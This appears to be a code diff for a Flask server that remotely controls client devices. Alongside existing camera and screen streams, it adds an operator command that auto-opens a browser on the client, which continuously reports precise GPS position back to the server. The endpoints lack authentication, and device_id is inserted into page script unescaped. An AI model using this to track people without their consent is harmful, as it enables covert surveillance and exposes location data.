@@ -51,11 +51,20 @@ def _default_stream_state() -> dict:
     return {"command": "STOP", "active": False, "latest_frame": None, "seq": 0, "last_ts": None}
 
 
+def _default_location_state() -> dict:
+    return {
+        "command": "CLOSE",     # commande VOULUE par la GUI : "OPEN" ou "CLOSE"
+        "browser_open": False,  # rapporté par le CLIENT : le navigateur est-il réellement ouvert ?
+        "latest": None,         # dernière position reçue : {"lat", "lon", "accuracy", "ts"}
+    }
+
+
 def _default_device_state(name: str | None) -> dict:
     return {
         "name": name or "Appareil inconnu",
         "last_seen": None,
         "streams": {stream: _default_stream_state() for stream in STREAM_NAMES},
+        "location": _default_location_state(),
     }
 
 
@@ -85,7 +94,13 @@ def _device_is_alive(device: dict) -> bool:
 @app.route("/api/command", methods=["GET"])
 def get_command():
     """Le client interroge cette route régulièrement avec son device_id ;
-    reçoit l'état voulu pour SES DEUX flux en une seule requête."""
+    reçoit l'état voulu pour SES DEUX flux, PLUS la commande de localisation
+    (OPEN/CLOSE), en une seule requête.
+
+    Au passage, le client signale via ?location_open=0|1 si SON navigateur
+    de localisation est actuellement ouvert ou non (il peut avoir été fermé
+    par l'utilisateur lui-même, indépendamment de toute commande de la GUI) :
+    c'est ce qui permet à la GUI d'afficher un statut fiable."""
     device_id = request.args.get("device_id")
     if not device_id:
         return jsonify({"error": "device_id manquant"}), 400
@@ -93,7 +108,13 @@ def get_command():
     with devices_lock:
         device = _get_or_create_device(device_id, request.args.get("name"))
         device["last_seen"] = time.time()
+
+        location_open_param = request.args.get("location_open")
+        if location_open_param is not None:
+            device["location"]["browser_open"] = location_open_param == "1"
+
         commands = {stream: device["streams"][stream]["command"] for stream in STREAM_NAMES}
+        commands["location"] = device["location"]["command"]
         return jsonify({"commands": commands})
 
 
@@ -157,6 +178,7 @@ def list_devices():
                 "name": device["name"],
                 "camera_on": device["streams"]["camera"]["active"],
                 "screen_on": device["streams"]["screen"]["active"],
+                "location_open": device["location"]["browser_open"],
                 "connected": _device_is_alive(device),
                 "last_seen": last_seen,
             })
@@ -254,6 +276,171 @@ def get_latest_frame():
     response.headers["X-Frame-Seq"] = str(seq)
     response.headers["Cache-Control"] = "no-store"
     return response
+
+
+# ---------------------------------------------------------------------
+# Localisation précise : navigateur ouvert/fermé chez le CLIENT à la
+# demande de la GUI, position récupérée par la page web (navigator.
+# geolocation) ET renvoyée au serveur — jamais calculée côté serveur.
+# ---------------------------------------------------------------------
+
+# Page servie dans le navigateur ouvert CHEZ LE CLIENT. Elle ne contacte que
+# CE serveur (chemins relatifs), donc fonctionne quelle que soit l'URL
+# publique du serveur. Les accolades littérales de CSS/JS sont doublées
+# ({{ }}) car le gabarit passe par str.format().
+LOCATION_PAGE_TEMPLATE = """<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Partage de position</title>
+<style>
+  body {{
+    margin: 0; min-height: 100vh; display: flex; flex-direction: column;
+    align-items: center; justify-content: center; text-align: center;
+    background: #0b1020; color: #e8ecf8; font-family: -apple-system, "Segoe UI", sans-serif;
+    padding: 24px; box-sizing: border-box;
+  }}
+  h1 {{ font-size: 1.15rem; margin-bottom: 4px; }}
+  p {{ color: #8b95b5; font-size: 0.9rem; margin: 6px 0; }}
+  #dot {{
+    width: 14px; height: 14px; border-radius: 50%; background: #f59e0b;
+    margin: 18px auto; box-shadow: 0 0 0 0 rgba(245,158,11,0.6);
+    animation: pulse 1.6s infinite;
+  }}
+  #dot.ok {{ background: #22c55e; box-shadow: 0 0 0 0 rgba(34,197,94,0.6); animation: none; }}
+  #dot.err {{ background: #ef4444; animation: none; }}
+  @keyframes pulse {{
+    0% {{ box-shadow: 0 0 0 0 rgba(245,158,11,0.5); }}
+    70% {{ box-shadow: 0 0 0 14px rgba(245,158,11,0); }}
+    100% {{ box-shadow: 0 0 0 0 rgba(245,158,11,0); }}
+  }}
+  #coords {{ font-family: Consolas, monospace; font-size: 0.85rem; color: #c5cce3; }}
+</style>
+</head>
+<body>
+  <h1>📍 Partage de position en cours</h1>
+  <p>Cette fenêtre peut être laissée ouverte en arrière-plan.</p>
+  <div id="dot"></div>
+  <p id="status">Demande d'autorisation de localisation...</p>
+  <p id="coords"></p>
+<script>
+  const DEVICE_ID = {device_id!r};
+  const dot = document.getElementById("dot");
+  const statusEl = document.getElementById("status");
+  const coordsEl = document.getElementById("coords");
+  let lastSent = 0;
+
+  function send(lat, lon, accuracy) {{
+    fetch("/location/report", {{
+      method: "POST",
+      headers: {{"Content-Type": "application/json"}},
+      body: JSON.stringify({{device_id: DEVICE_ID, lat: lat, lon: lon, accuracy: accuracy, ts: Date.now()}}),
+    }}).catch(function () {{}});
+  }}
+
+  function onPosition(pos) {{
+    dot.className = "ok";
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+    const acc = pos.coords.accuracy;
+    statusEl.textContent = "Position transmise au serveur.";
+    coordsEl.textContent = lat.toFixed(6) + ", " + lon.toFixed(6) + "  (± " + Math.round(acc) + " m)";
+    const now = Date.now();
+    if (now - lastSent > 2000) {{
+      lastSent = now;
+      send(lat, lon, acc);
+    }}
+  }}
+
+  function onError(err) {{
+    dot.className = "err";
+    statusEl.textContent = "Localisation refusée ou indisponible (" + err.message + ").";
+  }}
+
+  if (!navigator.geolocation) {{
+    dot.className = "err";
+    statusEl.textContent = "Ce navigateur ne supporte pas la géolocalisation.";
+  }} else {{
+    navigator.geolocation.watchPosition(onPosition, onError, {{
+      enableHighAccuracy: true, maximumAge: 0, timeout: 15000,
+    }});
+  }}
+</script>
+</body>
+</html>
+"""
+
+
+@app.route("/location/page", methods=["GET"])
+def location_page():
+    """Page ouverte AUTOMATIQUEMENT dans le navigateur du client (via
+    subprocess, voir client.py) quand la GUI envoie la commande OPEN."""
+    device_id = request.args.get("device_id", "")
+    return Response(LOCATION_PAGE_TEMPLATE.format(device_id=device_id), mimetype="text/html")
+
+
+@app.route("/location/report", methods=["POST"])
+def location_report():
+    """La PAGE WEB (chez le client) envoie ici la position obtenue par
+    navigator.geolocation. Le serveur ne fait que la stocker."""
+    payload = request.get_json(force=True, silent=True) or {}
+    device_id = payload.get("device_id")
+    lat, lon = payload.get("lat"), payload.get("lon")
+    if not device_id or lat is None or lon is None:
+        return jsonify({"error": "device_id, lat et lon requis"}), 400
+
+    with devices_lock:
+        device = _get_or_create_device(device_id)
+        device["last_seen"] = time.time()
+        device["location"]["latest"] = {
+            "lat": float(lat),
+            "lon": float(lon),
+            "accuracy": payload.get("accuracy"),
+            "ts": payload.get("ts", int(time.time() * 1000)),
+        }
+    return jsonify({"ok": True})
+
+
+@app.route("/api/location/command", methods=["POST"])
+def set_location_command():
+    """La GUI envoie {'device_id': ..., 'command': 'OPEN'|'CLOSE'} pour
+    ouvrir ou fermer le navigateur de localisation CHEZ LE CLIENT."""
+    payload = request.get_json(force=True, silent=True) or {}
+    device_id = payload.get("device_id")
+    command = payload.get("command")
+
+    if not device_id:
+        return jsonify({"error": "device_id manquant"}), 400
+    if command not in ("OPEN", "CLOSE"):
+        return jsonify({"error": "commande invalide (OPEN ou CLOSE attendu)"}), 400
+
+    with devices_lock:
+        device = devices.get(device_id)
+        if device is None:
+            return jsonify({"error": "appareil inconnu"}), 404
+        device["location"]["command"] = command
+    return jsonify({"ok": True})
+
+
+@app.route("/api/location/latest", methods=["GET"])
+def get_location_latest():
+    """La GUI interroge cette route pour afficher la carte : statut du
+    navigateur + dernière position connue de l'appareil."""
+    device_id = request.args.get("device_id")
+    if not device_id:
+        return jsonify({"error": "device_id manquant"}), 400
+
+    with devices_lock:
+        device = devices.get(device_id)
+        if device is None:
+            return jsonify({"error": "appareil inconnu"}), 404
+        location = device["location"]
+        return jsonify({
+            "command": location["command"],
+            "browser_open": location["browser_open"],
+            "latest": location["latest"],
+        })
 
 
 # ---------------------------------------------------------------------
